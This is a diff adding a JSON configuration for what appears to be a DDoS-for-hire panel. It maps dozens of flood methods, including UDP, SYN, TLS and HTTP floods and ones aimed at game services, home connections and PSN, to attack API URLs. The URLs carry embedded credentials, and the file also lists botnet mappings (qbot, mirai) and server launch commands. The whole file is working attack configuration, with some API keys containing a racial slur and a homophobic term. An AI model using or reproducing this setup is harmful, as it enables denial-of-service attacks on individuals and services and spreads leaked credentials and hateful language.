@@ -1,0 +1,698 @@
+[
+	{
+		"name":"UDP-FLOOD",
+		"time":60,
+		"description":"UDP Flood",
+		"permission":["vip"],
+		"api":[
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		],
+		"server":[
+			{
+				"name":"omega",
+				"command":"./udp <<$host>> <<$port>> <<$time>>"
+			},
+			{
+				"name":"alpha",
+				"command":"wall <<$host>> <<$port>> <<$time>>"
+			}
+		],
+		"botnet":{
+			"qbot":"udp",
+			"mirai":"udp"
+		}
+	},
+	{
+		"name":"TCP-FLOOD",
+		"time":60,
+		"description":"tcp Flood",
+		"permission":["vip"],
+		"api":[
+
+      "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=KILL",
+      "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD",
+      "http://194.180.49.165:1335/attack?key=rawclient1zopz&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Lsynflood&len=1460"
+		]
+},
+	{
+		"name":"OPENVPN",
+		"time":60,
+		"description":"tcp Flood",
+		"permission":["vip"],
+		"api":[
+      "http://194.180.49.165:1335/attack?key=rawclient1zopz&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Lopenvpn",
+      "https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP"
+		]
+	},
+	{
+	
+		"name":"LDAP",
+		"time":120,
+		"description":"Game Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=rawclient1zopz&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=0",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ldap"
+		]
+	},
+	{
+	
+		"name":"HOME",
+		"time":50000,
+		"description":"HOME Flood",
+		"permission":[],
+		"api":[
+       "https://api.chrysler.vip/api/attack?username=zopzzapi&key=zopzzapi&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=hold"
+		]
+	},
+	{
+	
+		"name":"DNS",
+		"time":60,
+		"description":"DNS Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=rawclient1zopz&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=0",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ldap"
+		]
+	},
+	{
+	
+		"name":"ZOPZ-RAW",
+		"time":120,
+		"description":"HOME RAW Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=rawclient1zopz&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=0",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ldap"
+		]
+	},
+	{
+	
+		"name":"NFO",
+		"time":60,
+		"description":"NFO Flood",
+		"permission":["vip","admin"],
+		"api":[
+			"http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&duration=<<$time>>&method=NFO"
+		]
+    },
+	{
+	
+		"name":"HOME-KILL",
+		"time":60,
+		"description":"KILLS HOMES",
+		"permission":["vip","admin"],
+		"api":[
+    
+       "http://194.180.49.165:1335/attack?key=rawclient1zopz&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1550",
+       "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+       "https://api.chrysler.vip/api/attack?username=zopzzapi&key=zopzzapi&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=hold"
+		]
+	},
+	{
+	
+		"name":"ZOPZ-HOME2K",
+		"time":120,
+		"description":"HOME2K Flood makes target stay at 2k ping",
+		"permission":["vip","admin"],
+		"api":[
+			"http://lucifer-api.me:44/attack?key=firelord21&target=<<$host>>&port=<<$port>>&duration=<<$time>>&method=HOME",
+       "https://api.chrysler.vip/api/attack?username=zopzzapi&key=zopzzapi&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=hold"
+		]
+	},
+	{
+	
+		"name":"ZOPZ-IPFREEZE",
+		"time":120,
+		"description":"IPFREEZE Flood",
+		"permission":["vip","admin"],
+		"api":[
+			"http://lucifer-api.me:44/attack?key=firelord21&target=<<$host>>&port=<<$port>>&duration=<<$time>>&method=HOME",
+       "https://api.chrysler.vip/api/attack?username=zopzzapi&key=zopzzapi&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=hold"
+		]
+	},
+	{
+	
+		"name":"ZOPZ-TMOBIE",
+		"time":120,
+		"description":"TMOBIE Flood",
+		"permission":["vip","admin"],
+		"api":[
+			"http://lucifer-api.me:44/attack?key=firelord21&target=<<$host>>&port=<<$port>>&duration=<<$time>>&method=HOME",
+       "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=hold"
+		]
+	},
+	{
+	
+		"name":"ZOPZ-HOTSPOT",
+		"time":120,
+		"description":"HOTSPOT Flood",
+		"permission":["vip","admin"],
+		"api":[
+			"http://lucifer-api.me:44/attack?key=firelord21&target=<<$host>>&port=<<$port>>&duration=<<$time>>&method=HOME",
+       "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=hold"
+	]
+},
+{
+	
+		"name":"R6-RANKED",
+		"time":60,
+		"description":"R6RANKED Flood",
+		"permission":["vip","admin"],
+		"api":[     
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+		"name":"FIVEMDIE",
+		"time":60,
+		"description":"FIVEMDIE",
+		"permission":["vip"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+	
+		"name":"GAME",
+		"time":60,
+		"description":"GAME Flood",
+		"permission":["vip","admin"],
+		"api":[
+			"http://xenema.xyz/api?key=monitorgay&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=PUDP",
+      "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=game"
+		]
+	},
+	{
+	
+		"name":"PUDP",
+		"time":60,
+		"description":"PUDP Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+    {
+	
+		"name":"SYN",
+		"time":60,
+		"description":"SYN Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://xenema.xyz/api?key=monitorgay&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=SYN"
+		]
+	},
+    {
+	
+		"name":"GAME-ALL",
+		"time":60,
+		"description":"GAME-ALL Flood",
+		"permission":["vip","admin"],
+		"api":[
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+		"name":"WARZONE-FREEZE",
+		"time":60,
+		"description":"WARZONE Flood",
+		"permission":["vip"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+	
+		"name":"STDHEX",
+		"time":60,
+		"description":"STDHEX Flood",
+		"permission":["vip","admin"],
+		"api":[
+			"http://192.210.160.149/reaper-api.php?key=freetrial929fe&user=purcend&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=STD-HEX"
+		]
+	},
+    {
+	
+		"name":"XVBLAZE",
+		"time":60,
+		"description":"XVBLAZE Flood",
+		"permission":["vip","admin"],
+		"api":[
+      "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=game"
+		]
+	},
+	{
+	
+		"name":"FNDROP",
+		"time":60,
+		"description":"FNDROP Flood",
+		"permission":["vip","admin"],
+   		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+	
+		"name":"WRAWWR6",
+		"time":60,
+		"description":"WRAWWR6 Flood",
+		"permission":["vip","admin"],
+		"api":[
+      "https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP"
+		]
+	},
+    {
+	
+		"name":"R6UAVI",
+		"time":60,
+		"description":"R6UAVI Flood",
+		"permission":["vip","admin"],
+		"api":[
+      "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=game"
+		]
+	},
+    {
+	
+		"name":"HTTPS-SLAP",
+		"time":60,
+		"description":"HTTPS-SLAP Flood",
+		"permission":["vip","admin"],
+		"api":[
+      "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS"
+		]
+	},
+    {
+	
+		"name":"MW2FAO",
+		"time":60,
+		"description":"MW2FAO Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://45.41.241.11:3000/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME-ALL"
+		]
+	},
+	{
+	
+		"name":"PSN-CRASH",
+		"time":60,
+		"default port":3478,
+		"description":"PSN-CRASH Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+	
+		"name":"FORTNITE-LAG",
+		"time":60,
+		"description":"FORTNITE-LAG Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+    },
+	{
+	
+		"name":"SPLITGATE-LAG",
+		"time":60,
+		"description":"FORTNITE-LAG Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+  {
+	
+		"name":"TLS",
+		"time":60,
+		"description":"TLS Flood",
+		"permission":["vip","admin"],
+		"api":[
+      "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS"
+		]
+	},
+  {
+	
+		"name":"TLSV2",
+		"time":60,
+		"description":"TLSV2 Flood",
+		"permission":["vip","admin"],
+		"api":[
+      "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS"
+		]
+	},
+  {
+	
+		"name":"HTTP",
+		"time":60,
+		"description":"HTTP Flood",
+		"permission":["vip","admin"],
+		"api":[
+      "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS",
+      "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPS"
+    		]
+	},
+  {
+	
+		"name":"MINECRAFT",
+		"time":60,
+		"description":"MINECRAFT Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+    		]
+	},
+  {
+	
+		"name":"VALVE",
+		"time":60,
+		"description":"VALVE Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+	
+		"name":"COD-CRASH",
+		"time":60,
+		"description":"COD-LAG Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+	
+		"name":"ROBLOX-FREEZE",
+		"time":60,
+		"description":"ROBLOX-FREEZE Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+    {
+	
+		"name":"R6UAVI",
+		"time":60,
+		"description":"R6UAVI Flood",
+		"permission":["vip","admin"],
+		"api":[
+      "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=game"
+		]
+	},
+    {
+	
+		"name":"HTTPS-SLAP",
+		"time":60,
+		"description":"HTTPS-SLAP Flood",
+		"permission":["vip","admin"],
+		"api":[
+         "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS",
+         "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS"
+		]
+	},
+    {
+	
+		"name":"MW2FAO",
+		"time":60,
+		"description":"MW2FAO Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+	
+		"name":"PSN-CRASH",
+		"time":60,
+		"default port":3478,
+		"description":"PSN-CRASH Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+	
+		"name":"FORTNITE-LAG",
+		"time":60,
+		"description":"FORTNITE-LAG Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+    },
+	{
+	
+		"name":"SPLITGATE-LAG",
+		"time":60,
+		"description":"FORTNITE-LAG Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+	{
+	
+		"name":"APEX-CRASH",
+		"time":60,
+		"description":"APEX Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+  {
+	
+		"name":"TLS",
+		"time":60,
+		"description":"TLS Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=[host]&port=[port]&time=[time]&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+		]
+	},
+  {
+	
+		"name":"TLSV2",
+		"time":60,
+		"description":"TLSV2 Flood",
+		"permission":["vip","admin"],
+		"api":[
+         "https://api.chryslervx.com/api/attack?username=zopzzapi&password=oM3KWdNwQM5cfG9GHw7pWpCgLQZ5VdwV&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS",
+         "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS"
+		]
+	},
+  {
+	
+		"name":"HTTP",
+		"time":60,
+		"description":"HTTP Flood",
+		"permission":["vip","admin"],
+		"api":[
+       "https://dxr.ooo/api/attack?host=<<$host>>&port=<<$port>>&duration=<<$time>>&method=HTTP&username=Zopz&secret=930-571-692"
+    		]
+	},
+  {
+	
+		"name":"RL-LAG",
+		"time":60,
+		"description":"Rocket League Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
